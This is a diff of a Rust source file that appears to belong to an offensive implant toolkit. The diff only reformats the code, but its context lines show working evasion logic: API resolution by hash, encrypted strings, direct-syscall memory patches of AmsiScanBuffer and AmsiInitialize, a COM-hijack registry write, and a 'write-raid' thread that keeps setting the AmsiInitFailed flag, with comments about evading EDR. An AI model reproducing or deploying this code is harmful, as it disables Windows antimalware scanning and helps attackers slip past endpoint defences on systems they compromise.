@@ -35,14 +35,23 @@ mod win_resolve {
     }
 
     /// Resolve a function pointer from a DLL, loading it if not already present.
-    pub unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) -> Option<T> {
+    pub unsafe fn resolve_api_or_load<T>(
+        dll_wide: &[u16],
+        dll_hash: u32,
+        fn_hash: u32,
+    ) -> Option<T> {
         let module = match pe_resolve::get_module_handle_by_hash(dll_hash) {
             Some(m) => m,
             None => {
                 let load_fn: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
-                    resolve_api(pe_resolve::HASH_KERNEL32_DLL, hash_str_const(b"LoadLibraryW\0"))?;
+                    resolve_api(
+                        pe_resolve::HASH_KERNEL32_DLL,
+                        hash_str_const(b"LoadLibraryW\0"),
+                    )?;
                 let m = load_fn(dll_wide.as_ptr());
-                if m.is_null() { return None; }
+                if m.is_null() {
+                    return None;
+                }
                 m as usize
             }
         };
@@ -52,42 +61,41 @@ mod win_resolve {
 
     // ── DLL wide strings & hashes ──────────────────────────────────────────────
     pub const ADVAPI32_DLL_W: &[u16] = &[
-        'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16,
-        'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16,
-        'l' as u16, 'l' as u16, 0,
+        'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16,
+        '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
     ];
     pub const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_W);
 
     // ── API hash constants ─────────────────────────────────────────────────────
     // advapi32
-    pub const HASH_REGCREATEKEYEXA: u32  = hash_str_const(b"RegCreateKeyExA\0");
-    pub const HASH_REGSETVALUEEXA: u32   = hash_str_const(b"RegSetValueExA\0");
-    pub const HASH_REGCLOSEKEY: u32      = hash_str_const(b"RegCloseKey\0");
-    pub const HASH_REGDELETEKEYA: u32    = hash_str_const(b"RegDeleteKeyA\0");
+    pub const HASH_REGCREATEKEYEXA: u32 = hash_str_const(b"RegCreateKeyExA\0");
+    pub const HASH_REGSETVALUEEXA: u32 = hash_str_const(b"RegSetValueExA\0");
+    pub const HASH_REGCLOSEKEY: u32 = hash_str_const(b"RegCloseKey\0");
+    pub const HASH_REGDELETEKEYA: u32 = hash_str_const(b"RegDeleteKeyA\0");
 
     // kernel32
-    pub const HASH_SWITCHTOTHREAD: u32   = hash_str_const(b"SwitchToThread\0");
+    pub const HASH_SWITCHTOTHREAD: u32 = hash_str_const(b"SwitchToThread\0");
 
     // ── Function pointer types ─────────────────────────────────────────────────
     // advapi32
     pub type FnRegCreateKeyExA = unsafe extern "system" fn(
-        *mut std::ffi::c_void,       // hKey
-        *const i8,                   // lpSubKey
-        u32,                         // Reserved
-        *mut u8,                     // lpClass
-        u32,                         // dwOptions
-        u32,                         // samDesired
-        *mut std::ffi::c_void,       // lpSecurityAttributes
-        *mut *mut std::ffi::c_void,  // phkResult
-        *mut u32,                    // lpdwDisposition
+        *mut std::ffi::c_void,      // hKey
+        *const i8,                  // lpSubKey
+        u32,                        // Reserved
+        *mut u8,                    // lpClass
+        u32,                        // dwOptions
+        u32,                        // samDesired
+        *mut std::ffi::c_void,      // lpSecurityAttributes
+        *mut *mut std::ffi::c_void, // phkResult
+        *mut u32,                   // lpdwDisposition
     ) -> i32;
     pub type FnRegSetValueExA = unsafe extern "system" fn(
-        *mut std::ffi::c_void,       // hKey
-        *const i8,                   // lpValueName
-        u32,                         // Reserved
-        u32,                         // dwType
-        *const u8,                   // lpData
-        u32,                         // cbData
+        *mut std::ffi::c_void, // hKey
+        *const i8,             // lpValueName
+        u32,                   // Reserved
+        u32,                   // dwType
+        *const u8,             // lpData
+        u32,                   // cbData
     ) -> i32;
     pub type FnRegCloseKey = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
     pub type FnRegDeleteKeyA = unsafe extern "system" fn(*mut std::ffi::c_void, *const i8) -> i32;
@@ -266,12 +274,17 @@ fn apply_memory_patch() {
     /// Helper: change memory protection via NtProtectVirtualMemory (syscall).
     /// Returns `true` on success (NTSTATUS >= 0).
     #[inline(always)]
-    unsafe fn nt_protect(base: *mut std::ffi::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
+    unsafe fn nt_protect(
+        base: *mut std::ffi::c_void,
+        size: usize,
+        new_prot: u32,
+        old_prot: *mut u32,
+    ) -> bool {
         let mut prot_base = base;
         let mut prot_size = size;
         let status = crate::syscall!(
             "NtProtectVirtualMemory",
-            (-1isize) as u64,                      // NtCurrentProcess()
+            (-1isize) as u64, // NtCurrentProcess()
             &mut prot_base as *mut _ as u64,
             &mut prot_size as *mut _ as u64,
             new_prot as u64,
@@ -314,9 +327,7 @@ fn apply_memory_patch() {
             nt_protect(scan_buf, patch.len(), old_protect, &mut old_protect);
             log::debug!("apply_memory_patch: AmsiScanBuffer patched");
         } else {
-            log::warn!(
-                "apply_memory_patch: NtProtectVirtualMemory failed for AmsiScanBuffer"
-            );
+            log::warn!("apply_memory_patch: NtProtectVirtualMemory failed for AmsiScanBuffer");
         }
 
         // Also patch AmsiScanString
@@ -350,15 +361,18 @@ fn apply_com_hijack() {
             win_resolve::ADVAPI32_DLL_W,
             win_resolve::HASH_ADVAPI32_DLL,
             win_resolve::HASH_REGCREATEKEYEXA,
-        ).expect("RegCreateKeyExA not found");
+        )
+        .expect("RegCreateKeyExA not found");
         let reg_set: win_resolve::FnRegSetValueExA = win_resolve::resolve_api(
             win_resolve::HASH_ADVAPI32_DLL,
             win_resolve::HASH_REGSETVALUEEXA,
-        ).expect("RegSetValueExA not found");
+        )
+        .expect("RegSetValueExA not found");
         let reg_close: win_resolve::FnRegCloseKey = win_resolve::resolve_api(
             win_resolve::HASH_ADVAPI32_DLL,
             win_resolve::HASH_REGCLOSEKEY,
-        ).expect("RegCloseKey not found");
+        )
+        .expect("RegCloseKey not found");
 
         let mut hkey = ptr::null_mut();
         if reg_create(
@@ -400,7 +414,8 @@ pub fn cleanup_com_hijack() {
         let reg_delete: win_resolve::FnRegDeleteKeyA = win_resolve::resolve_api(
             win_resolve::HASH_ADVAPI32_DLL,
             win_resolve::HASH_REGDELETEKEYA,
-        ).expect("RegDeleteKeyA not found");
+        )
+        .expect("RegDeleteKeyA not found");
         reg_delete(HKEY_CURRENT_USER, leaf.as_ptr() as _);
         reg_delete(HKEY_CURRENT_USER, parent.as_ptr() as _);
     }
@@ -416,12 +431,17 @@ fn set_init_failed_flag() {
     /// Helper: change memory protection via NtProtectVirtualMemory (syscall).
     /// Returns `true` on success (NTSTATUS >= 0).
     #[inline(always)]
-    unsafe fn nt_protect(base: *mut std::ffi::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
+    unsafe fn nt_protect(
+        base: *mut std::ffi::c_void,
+        size: usize,
+        new_prot: u32,
+        old_prot: *mut u32,
+    ) -> bool {
         let mut prot_base = base;
         let mut prot_size = size;
         let status = crate::syscall!(
             "NtProtectVirtualMemory",
-            (-1isize) as u64,                      // NtCurrentProcess()
+            (-1isize) as u64, // NtCurrentProcess()
             &mut prot_base as *mut _ as u64,
             &mut prot_size as *mut _ as u64,
             new_prot as u64,
@@ -452,19 +472,12 @@ fn set_init_failed_flag() {
         ];
         let mut old: u32 = 0;
         // P2-05: RW → write → restore (never RWX)
-        if nt_protect(
-            init_fn,
-            patch.len(),
-            win_resolve::PAGE_READWRITE,
-            &mut old,
-        ) {
+        if nt_protect(init_fn, patch.len(), win_resolve::PAGE_READWRITE, &mut old) {
             std::ptr::copy_nonoverlapping(patch.as_ptr(), init_fn as *mut u8, patch.len());
             nt_protect(init_fn, patch.len(), old, &mut old);
             log::debug!("set_init_failed_flag: AmsiInitialize patched to return E_FAIL");
         } else {
-            log::warn!(
-                "set_init_failed_flag: NtProtectVirtualMemory failed for AmsiInitialize"
-            );
+            log::warn!("set_init_failed_flag: NtProtectVirtualMemory failed for AmsiInitialize");
         }
     }
 }
@@ -659,19 +672,11 @@ mod write_raid {
         //   mov dword ptr [rip+disp32], 1  (sets AmsiInitFailed = TRUE)
         for i in 0..bytes.len().saturating_sub(9) {
             if bytes[i] == 0xC7 && bytes[i + 1] == 0x05 {
-                let disp = i32::from_le_bytes([
-                    bytes[i + 2],
-                    bytes[i + 3],
-                    bytes[i + 4],
-                    bytes[i + 5],
-                ]);
+                let disp =
+                    i32::from_le_bytes([bytes[i + 2], bytes[i + 3], bytes[i + 4], bytes[i + 5]]);
                 // The immediate must be 1 (setting the flag to TRUE).
-                let imm = u32::from_le_bytes([
-                    bytes[i + 6],
-                    bytes[i + 7],
-                    bytes[i + 8],
-                    bytes[i + 9],
-                ]);
+                let imm =
+                    u32::from_le_bytes([bytes[i + 6], bytes[i + 7], bytes[i + 8], bytes[i + 9]]);
                 if imm == 1 {
                     let rip_after_insn = init_fn + i + 10;
                     let target = (rip_after_insn as i64 + disp as i64) as usize;
@@ -691,12 +696,8 @@ mod write_raid {
         // or  C6 05 XX XX XX XX 01     (mov byte ptr [rip+disp32], 1)
         for i in 0..bytes.len().saturating_sub(6) {
             if bytes[i] == 0xC6 && bytes[i + 1] == 0x05 {
-                let disp = i32::from_le_bytes([
-                    bytes[i + 2],
-                    bytes[i + 3],
-                    bytes[i + 4],
-                    bytes[i + 5],
-                ]);
+                let disp =
+                    i32::from_le_bytes([bytes[i + 2], bytes[i + 3], bytes[i + 4], bytes[i + 5]]);
                 let rip_after_insn = init_fn + i + 6;
                 let target = (rip_after_insn as i64 + disp as i64) as usize;
                 if is_within_amsi_data(amsi_base, target) {
@@ -715,7 +716,7 @@ mod write_raid {
 
     /// Check whether `addr` falls within the `.data` section of amsi.dll.
     unsafe fn is_within_amsi_data(amsi_base: usize, addr: usize) -> bool {
-        use win_resolve::{ImageDosHeader, ImageNtHeaders64, ImageSectionHeader, ImageFileHeader};
+        use win_resolve::{ImageDosHeader, ImageFileHeader, ImageNtHeaders64, ImageSectionHeader};
 
         let dos = &*(amsi_base as *const ImageDosHeader);
         if dos.e_magic != 0x5A4D {
@@ -728,7 +729,8 @@ mod write_raid {
         let sections_ptr = (amsi_base + dos.e_lfanew as usize
             + std::mem::size_of::<u32>() // Signature
             + std::mem::size_of::<ImageFileHeader>()
-            + nt.file_header.size_of_optional_header as usize) as *const ImageSectionHeader;
+            + nt.file_header.size_of_optional_header as usize)
+            as *const ImageSectionHeader;
 
         for i in 0..n_sections {
             let sec = &*sections_ptr.add(i);
@@ -773,9 +775,7 @@ mod write_raid {
         // Use NtWriteVirtualMemory on NtCurrentProcess so the writes appear
         // as cross-process operations (not simple pointer dereferences that
         // EDR can intercept via copy-on-write page faults).
-        let ntdll_hash = pe_resolve::hash_str(
-            &string_crypt::enc_str!("ntdll.dll\0"),
-        );
+        let ntdll_hash = pe_resolve::hash_str(&string_crypt::enc_str!("ntdll.dll\0"));
         let ntdll_base = match pe_resolve::get_module_handle_by_hash(ntdll_hash) {
             Some(b) => b,
             None => {
@@ -785,9 +785,8 @@ mod write_raid {
             }
         };
 
-        let write_vmem_hash = pe_resolve::hash_str(
-            &string_crypt::enc_str!("NtWriteVirtualMemory\0"),
-        );
+        let write_vmem_hash =
+            pe_resolve::hash_str(&string_crypt::enc_str!("NtWriteVirtualMemory\0"));
         let write_vmem_fn = match pe_resolve::get_proc_address_by_hash(ntdll_base, write_vmem_hash)
         {
             Some(a) => a,
@@ -799,9 +798,7 @@ mod write_raid {
         };
 
         // Also resolve NtDelayExecution for yielding.
-        let delay_hash = pe_resolve::hash_str(
-            &string_crypt::enc_str!("NtDelayExecution\0"),
-        );
+        let delay_hash = pe_resolve::hash_str(&string_crypt::enc_str!("NtDelayExecution\0"));
         let delay_fn = pe_resolve::get_proc_address_by_hash(ntdll_base, delay_hash);
 
         log::info!("write_raid: race thread started");
@@ -821,8 +818,16 @@ mod write_raid {
                             super::win_resolve::resolve_api(
                                 pe_resolve::HASH_KERNEL32_DLL,
                                 super::win_resolve::HASH_SWITCHTOTHREAD,
-                            ).unwrap_or_else(|| std::mem::transmute::<usize, super::win_resolve::FnSwitchToThread>(0));
-                        if std::mem::transmute::<super::win_resolve::FnSwitchToThread, usize>(switch_thread) != 0 {
+                            )
+                            .unwrap_or_else(|| {
+                                std::mem::transmute::<usize, super::win_resolve::FnSwitchToThread>(
+                                    0,
+                                )
+                            });
+                        if std::mem::transmute::<super::win_resolve::FnSwitchToThread, usize>(
+                            switch_thread,
+                        ) != 0
+                        {
                             switch_thread();
                         }
                     }
@@ -875,16 +880,17 @@ mod write_raid {
 
             // Yield: NtDelayExecution with 0ns delay.
             if let Some(addr) = delay_fn {
-                let nt_delay: extern "system" fn(u8, *mut i64) -> i32 =
-                    std::mem::transmute(addr);
+                let nt_delay: extern "system" fn(u8, *mut i64) -> i32 = std::mem::transmute(addr);
                 let mut delay_100ns: i64 = 0; // 0 = yield
                 nt_delay(0, &mut delay_100ns);
             } else {
                 // Fallback: kernel32 SwitchToThread via pe_resolve.
-                if let Some(switch_fn) = super::win_resolve::resolve_api::<super::win_resolve::FnSwitchToThread>(
-                    pe_resolve::HASH_KERNEL32_DLL,
-                    super::win_resolve::HASH_SWITCHTOTHREAD,
-                ) {
+                if let Some(switch_fn) =
+                    super::win_resolve::resolve_api::<super::win_resolve::FnSwitchToThread>(
+                        pe_resolve::HASH_KERNEL32_DLL,
+                        super::win_resolve::HASH_SWITCHTOTHREAD,
+                    )
+                {
                     switch_fn();
                 }
             }
@@ -928,7 +934,9 @@ mod write_raid {
     /// Returns an error if amsi.dll is not loaded or the flag cannot be
     /// located.
     pub fn enable() -> anyhow::Result<()> {
-        let _guard = LOCK.lock().map_err(|e| anyhow::anyhow!("lock poisoned: {e}"))?;
+        let _guard = LOCK
+            .lock()
+            .map_err(|e| anyhow::anyhow!("lock poisoned: {e}"))?;
 
         if ACTIVE.load(Ordering::Acquire) {
             log::debug!("write_raid: already active — skipping");
@@ -937,9 +945,7 @@ mod write_raid {
 
         unsafe {
             // Resolve amsi.dll base.
-            let amsi_hash = pe_resolve::hash_str(
-                &string_crypt::enc_str!("amsi.dll\0"),
-            );
+            let amsi_hash = pe_resolve::hash_str(&string_crypt::enc_str!("amsi.dll\0"));
             let amsi_base = match pe_resolve::get_module_handle_by_hash(amsi_hash) {
                 Some(b) => b,
                 None => {
@@ -951,9 +957,7 @@ mod write_raid {
 
             // Locate the AmsiInitFailed flag.
             let flag_addr = find_init_failed_flag(amsi_base).ok_or_else(|| {
-                anyhow::anyhow!(
-                    "could not locate AmsiInitFailed flag in amsi.dll .data section"
-                )
+                anyhow::anyhow!("could not locate AmsiInitFailed flag in amsi.dll .data section")
             })?;
 
             INIT_FAILED_ADDR.store(flag_addr as u64, Ordering::Release);
@@ -976,16 +980,16 @@ mod write_raid {
             let create_status = crate::syscall!(
                 "NtCreateThreadEx",
                 &mut thread_handle as *mut u64 as u64, // ThreadHandle
-                THREAD_WAIT_ACCESS,                            // DesiredAccess (minimal)
-                0u64,                                    // ObjectAttributes
-                (-1isize) as u64,                        // ProcessHandle (current)
+                THREAD_WAIT_ACCESS,                    // DesiredAccess (minimal)
+                0u64,                                  // ObjectAttributes
+                (-1isize) as u64,                      // ProcessHandle (current)
                 thread_proc as *mut std::ffi::c_void as u64, // StartRoutine
-                0u64,                                    // Argument
-                0u64,                                    // CreateFlags (run immediately)
-                0u64,                                    // ZeroBits
-                0u64,                                    // StackSize
-                0u64,                                    // MaximumStackSize
-                0u64,                                    // AttributeList
+                0u64,                                  // Argument
+                0u64,                                  // CreateFlags (run immediately)
+                0u64,                                  // ZeroBits
+                0u64,                                  // StackSize
+                0u64,                                  // MaximumStackSize
+                0u64,                                  // AttributeList
             );
 
             match create_status {
@@ -1006,12 +1010,10 @@ mod write_raid {
                     );
                     Ok(())
                 }
-                Ok(status) => {
-                    Err(anyhow::anyhow!(
-                        "NtCreateThreadEx returned NTSTATUS {:#x}",
-                        status
-                    ))
-                }
+                Ok(status) => Err(anyhow::anyhow!(
+                    "NtCreateThreadEx returned NTSTATUS {:#x}",
+                    status
+                )),
                 Err(e) => Err(anyhow::anyhow!("NtCreateThreadEx failed: {e}")),
             }
         }
@@ -1022,7 +1024,9 @@ mod write_raid {
     /// Signals the write-raid thread to stop and waits for it to exit.
     /// Restores the original `AmsiInitFailed` value (0).
     pub fn disable() -> anyhow::Result<()> {
-        let _guard = LOCK.lock().map_err(|e| anyhow::anyhow!("lock poisoned: {e}"))?;
+        let _guard = LOCK
+            .lock()
+            .map_err(|e| anyhow::anyhow!("lock poisoned: {e}"))?;
 
         if !ACTIVE.load(Ordering::Acquire) {
             log::debug!("write_raid: not active — nothing to disable");
@@ -1038,10 +1042,12 @@ mod write_raid {
                 break;
             }
             unsafe {
-                if let Some(switch_fn) = super::win_resolve::resolve_api::<super::win_resolve::FnSwitchToThread>(
-                    pe_resolve::HASH_KERNEL32_DLL,
-                    super::win_resolve::HASH_SWITCHTOTHREAD,
-                ) {
+                if let Some(switch_fn) =
+                    super::win_resolve::resolve_api::<super::win_resolve::FnSwitchToThread>(
+                        pe_resolve::HASH_KERNEL32_DLL,
+                        super::win_resolve::HASH_SWITCHTOTHREAD,
+                    )
+                {
                     switch_fn();
                 }
             }
@@ -1052,11 +1058,7 @@ mod write_raid {
             let handle = RAID_THREAD_HANDLE.load(Ordering::Acquire);
             if handle != 0 {
                 unsafe {
-                    let _ = crate::syscall!(
-                        "NtTerminateThread",
-                        handle,
-                        0u64,
-                    );
+                    let _ = crate::syscall!("NtTerminateThread", handle, 0u64,);
                 }
             }
             ACTIVE.store(false, Ordering::Release);
@@ -1153,13 +1155,9 @@ mod write_raid {
         }
         if tid == 0 {
             // Fallback: use GetThreadId from kernel32.
-            let k32_hash = pe_resolve::hash_str(
-                &string_crypt::enc_str!("kernel32.dll\0"),
-            );
+            let k32_hash = pe_resolve::hash_str(&string_crypt::enc_str!("kernel32.dll\0"));
             if let Some(k32) = pe_resolve::get_module_handle_by_hash(k32_hash) {
-                let gti_hash = pe_resolve::hash_str(
-                    &string_crypt::enc_str!("GetThreadId\0"),
-                );
+                let gti_hash = pe_resolve::hash_str(&string_crypt::enc_str!("GetThreadId\0"));
                 if let Some(addr) = pe_resolve::get_proc_address_by_hash(k32, gti_hash) {
                     let get_thread_id_fn: extern "system" fn(u64) -> u32 =
                         std::mem::transmute(addr);
@@ -1212,12 +1210,16 @@ pub fn resume_write_raid() {
 // Stubs for non-Windows or when write-raid-amsi is not enabled.
 #[cfg(not(all(windows, feature = "write-raid-amsi")))]
 pub fn enable_write_raid() -> anyhow::Result<()> {
-    Err(anyhow::anyhow!("write-raid AMSI bypass requires Windows + write-raid-amsi feature"))
+    Err(anyhow::anyhow!(
+        "write-raid AMSI bypass requires Windows + write-raid-amsi feature"
+    ))
 }
 
 #[cfg(not(all(windows, feature = "write-raid-amsi")))]
 pub fn disable_write_raid() -> anyhow::Result<()> {
-    Err(anyhow::anyhow!("write-raid AMSI bypass requires Windows + write-raid-amsi feature"))
+    Err(anyhow::anyhow!(
+        "write-raid AMSI bypass requires Windows + write-raid-amsi feature"
+    ))
 }
 
 #[cfg(not(all(windows, feature = "write-raid-amsi")))]
